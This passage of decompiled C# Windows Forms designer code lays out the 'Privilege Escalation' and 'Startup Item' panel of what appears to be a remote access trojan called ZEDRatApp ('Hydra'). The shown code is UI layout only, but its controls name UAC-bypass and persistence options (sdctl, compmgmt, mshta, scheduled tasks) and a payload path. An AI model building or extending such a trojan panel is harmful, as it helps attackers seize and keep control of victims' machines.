			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel6);
			this.Guna2GroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.Guna2GroupBox1.FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Location = new System.Drawing.Point(16, 91);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Name = "Guna2GroupBox1";
			this.Guna2GroupBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2GroupBox1;
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Size = new System.Drawing.Size(848, 118);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).TabIndex = 40;
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).Text = "Privilige Escalation";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2GroupBox1, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2GroupBox1, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2GroupBox1, "");
			((System.Windows.Forms.Control)(object)this.systempermRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.systempermRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.systempermRadioButton.CheckedState.BorderThickness = 0;
			this.systempermRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.systempermRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.systempermRadioButton).Location = new System.Drawing.Point(435, 82);
			((System.Windows.Forms.Control)(object)this.systempermRadioButton).Name = "systempermRadioButton";
			((System.Windows.Forms.Control)(object)this.systempermRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.systempermRadioButton).TabIndex = 18;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.systempermRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.systempermRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.systempermRadioButton, "");
			this.systempermRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.systempermRadioButton.UncheckedState.BorderThickness = 2;
			this.systempermRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.systempermRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			((System.Windows.Forms.Control)(object)this.sdctlRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.sdctlRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.sdctlRadioButton.CheckedState.BorderThickness = 0;
			this.sdctlRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.sdctlRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.sdctlRadioButton).Location = new System.Drawing.Point(435, 50);
			((System.Windows.Forms.Control)(object)this.sdctlRadioButton).Name = "sdctlRadioButton";
			((System.Windows.Forms.Control)(object)this.sdctlRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.sdctlRadioButton).TabIndex = 17;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.sdctlRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.sdctlRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.sdctlRadioButton, "");
			this.sdctlRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.sdctlRadioButton.UncheckedState.BorderThickness = 2;
			this.sdctlRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.sdctlRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			((System.Windows.Forms.Control)(object)this.compmgmtRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.compmgmtRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.compmgmtRadioButton.CheckedState.BorderThickness = 0;
			this.compmgmtRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.compmgmtRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.compmgmtRadioButton).Location = new System.Drawing.Point(13, 82);
			((System.Windows.Forms.Control)(object)this.compmgmtRadioButton).Name = "compmgmtRadioButton";
			((System.Windows.Forms.Control)(object)this.compmgmtRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.compmgmtRadioButton).TabIndex = 16;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.compmgmtRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.compmgmtRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.compmgmtRadioButton, "");
			this.compmgmtRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.compmgmtRadioButton.UncheckedState.BorderThickness = 2;
			this.compmgmtRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.compmgmtRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			this.Guna2GroupBox2.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.mshtaRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.SoguRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.SismluautilRadioButton);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel7);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel3);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel4);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel8);
			this.Guna2GroupBox2.CustomBorderColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.Guna2GroupBox2.FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Location = new System.Drawing.Point(16, 338);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Name = "Guna2GroupBox2";
			this.Guna2GroupBox2.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2GroupBox2;
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Size = new System.Drawing.Size(848, 118);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).TabIndex = 41;
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).Text = "Startup Item";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2GroupBox2, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2GroupBox2, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2GroupBox2, "");
			((System.Windows.Forms.Control)(object)this.mshtaRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.mshtaRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.mshtaRadioButton.CheckedState.BorderThickness = 0;
			this.mshtaRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.mshtaRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.mshtaRadioButton).Location = new System.Drawing.Point(435, 85);
			((System.Windows.Forms.Control)(object)this.mshtaRadioButton).Name = "mshtaRadioButton";
			((System.Windows.Forms.Control)(object)this.mshtaRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.mshtaRadioButton).TabIndex = 21;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.mshtaRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.mshtaRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.mshtaRadioButton, "");
			this.mshtaRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.mshtaRadioButton.UncheckedState.BorderThickness = 2;
			this.mshtaRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.mshtaRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.TaskPlanningRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.TaskPlanningRadioButton.CheckedState.BorderThickness = 0;
			this.TaskPlanningRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.TaskPlanningRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton).Location = new System.Drawing.Point(435, 54);
			((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton).Name = "TaskPlanningRadioButton";
			((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton).TabIndex = 20;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.TaskPlanningRadioButton, "");
			this.TaskPlanningRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.TaskPlanningRadioButton.UncheckedState.BorderThickness = 2;
			this.TaskPlanningRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.TaskPlanningRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			((System.Windows.Forms.Control)(object)this.SoguRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.SoguRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.SoguRadioButton.CheckedState.BorderThickness = 0;
			this.SoguRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.SoguRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.SoguRadioButton).Location = new System.Drawing.Point(13, 84);
			((System.Windows.Forms.Control)(object)this.SoguRadioButton).Name = "SoguRadioButton";
			((System.Windows.Forms.Control)(object)this.SoguRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.SoguRadioButton).TabIndex = 19;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.SoguRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.SoguRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.SoguRadioButton, "");
			this.SoguRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.SoguRadioButton.UncheckedState.BorderThickness = 2;
			this.SoguRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.SoguRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			((System.Windows.Forms.Control)(object)this.SismluautilRadioButton).BackColor = System.Drawing.Color.Transparent;
			this.SismluautilRadioButton.CheckedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.SismluautilRadioButton.CheckedState.BorderThickness = 0;
			this.SismluautilRadioButton.CheckedState.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.SismluautilRadioButton.CheckedState.InnerColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.SismluautilRadioButton).Location = new System.Drawing.Point(13, 55);
			((System.Windows.Forms.Control)(object)this.SismluautilRadioButton).Name = "SismluautilRadioButton";
			((System.Windows.Forms.Control)(object)this.SismluautilRadioButton).Size = new System.Drawing.Size(20, 20);
			((System.Windows.Forms.Control)(object)this.SismluautilRadioButton).TabIndex = 18;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.SismluautilRadioButton, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.SismluautilRadioButton, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.SismluautilRadioButton, "");
			this.SismluautilRadioButton.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(125, 137, 149);
			this.SismluautilRadioButton.UncheckedState.BorderThickness = 2;
			this.SismluautilRadioButton.UncheckedState.FillColor = System.Drawing.Color.Transparent;
			this.SismluautilRadioButton.UncheckedState.InnerColor = System.Drawing.Color.Transparent;
			(this.Guna2Button1).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.Guna2Button1).BorderThickness = 1;
			(this.Guna2Button1).CheckedState.Parent = this.Guna2Button1;
			(this.Guna2Button1).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.Guna2Button1).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.Guna2Button1).CustomImages.Parent = this.Guna2Button1;
			(this.Guna2Button1).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.Guna2Button1).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.Guna2Button1).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.Guna2Button1).Location = new System.Drawing.Point(721, 279);
			((System.Windows.Forms.Control)(object)this.Guna2Button1).Name = "Guna2Button1";
			(this.Guna2Button1).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2Button1;
			((System.Windows.Forms.Control)(object)this.Guna2Button1).Size = new System.Drawing.Size(138, 28);
			((System.Windows.Forms.Control)(object)this.Guna2Button1).TabIndex = 42;
			((System.Windows.Forms.Control)(object)this.Guna2Button1).Text = "Add To";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2Button1, "Add to startup");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2Button1, ZEDRatApp.Properties.Resources.startup_programs);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2Button1, "Hydra");
			((System.Windows.Forms.Control)(object)this.Guna2Button1).Click += new System.EventHandler(button2_Click);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel10.Font = new System.Drawing.Font("Century Gothic", 9f);
			this.Guna2HtmlLabel10.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10).Location = new System.Drawing.Point(486, 267);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10).Name = "Guna2HtmlLabel10";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10).Size = new System.Drawing.Size(69, 19);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10).TabIndex = 43;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10).Text = "Parameter:";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10, "");
			(this.btnRandom).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnRandom).BorderThickness = 1;
			(this.btnRandom).CheckedState.Parent = this.btnRandom;
			(this.btnRandom).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnRandom).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnRandom).CustomImages.Parent = this.btnRandom;
			(this.btnRandom).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnRandom).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnRandom).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnRandom).Location = new System.Drawing.Point(442, 262);
			((System.Windows.Forms.Control)(object)this.btnRandom).Name = "btnRandom";
			(this.btnRandom).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnRandom;
			((System.Windows.Forms.Control)(object)this.btnRandom).Size = new System.Drawing.Size(29, 28);
			((System.Windows.Forms.Control)(object)this.btnRandom).TabIndex = 44;
			((System.Windows.Forms.Control)(object)this.btnRandom).Text = "E";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.btnRandom, "Get the path of the payload");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.btnRandom, ZEDRatApp.Properties.Resources.exe);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.btnRandom, "Hydra");
			((System.Windows.Forms.Control)(object)this.btnRandom).Click += new System.EventHandler(label1_Click);
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(-2, 57);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(879, 9);
			this.bunifuSeparator2.TabIndex = 90;
			this.bunifuToolTip1.SetToolTip(this.bunifuSeparator2, "");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuSeparator2, null);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuSeparator2, "");
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.Guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.Guna2ControlBox1.BorderRadius = 12;
			this.Guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Location = new System.Drawing.Point(821, 12);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Name = "Guna2ControlBox1";
			this.Guna2ControlBox1.PressedColor = System.Drawing.Color.Red;
			this.Guna2ControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2ControlBox1;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).TabIndex = 91;
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.Guna2ControlBox1, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.Guna2ControlBox1, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.Guna2ControlBox1, "");
			this.bunifuToolTip1.Active = true;
			this.bunifuToolTip1.AlignTextWithTitle = false;
			this.bunifuToolTip1.AllowAutoClose = false;
			this.bunifuToolTip1.AllowFading = true;
			this.bunifuToolTip1.AutoCloseDuration = 5000;
			this.bunifuToolTip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuToolTip1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuToolTip1.ClickToShowDisplayControl = false;
			this.bunifuToolTip1.ConvertNewlinesToBreakTags = true;
			this.bunifuToolTip1.DisplayControl = null;
			this.bunifuToolTip1.EntryAnimationSpeed = 350;
			this.bunifuToolTip1.ExitAnimationSpeed = 200;
			this.bunifuToolTip1.GenerateAutoCloseDuration = false;
			this.bunifuToolTip1.IconMargin = 6;
			this.bunifuToolTip1.InitialDelay = 0;
			this.bunifuToolTip1.Name = "bunifuToolTip1";
			this.bunifuToolTip1.Opacity = 1.0;
			this.bunifuToolTip1.OverrideToolTipTitles = false;
			this.bunifuToolTip1.Padding = new System.Windows.Forms.Padding(10);
			this.bunifuToolTip1.ReshowDelay = 100;
			this.bunifuToolTip1.ShowAlways = true;
			this.bunifuToolTip1.ShowBorders = false;
			this.bunifuToolTip1.ShowIcons = true;
			this.bunifuToolTip1.ShowShadows = true;
			this.bunifuToolTip1.Tag = null;
			this.bunifuToolTip1.TextFont = new System.Drawing.Font("Century Gothic", 9f);
			this.bunifuToolTip1.TextForeColor = System.Drawing.Color.White;
			this.bunifuToolTip1.TextMargin = 2;
			this.bunifuToolTip1.TitleFont = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Bold);
			this.bunifuToolTip1.TitleForeColor = System.Drawing.Color.Gainsboro;
			this.bunifuToolTip1.ToolTipPosition = new System.Drawing.Point(0, 0);
			this.bunifuToolTip1.ToolTipTitle = null;
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(14, 12);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 169;
			this.bunifuToolTip1.SetToolTip(this.CloseBtn, "");
			this.bunifuToolTip1.SetToolTipIcon(this.CloseBtn, null);
			this.bunifuToolTip1.SetToolTipTitle(this.CloseBtn, "");
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(878, 475);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2ControlBox1);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnRandom);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel10);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2Button1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel9);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtExePath);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnBuild);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtParam);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2GroupBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2GroupBox2);
			this.ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Privilege_Escalation";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			base.Load += new System.EventHandler(Privilege_Escalation_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(Privilege_Escalation_MouseDown);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).ResumeLayout(false);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox1).PerformLayout();
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).ResumeLayout(false);
			((System.Windows.Forms.Control)(object)this.Guna2GroupBox2).PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
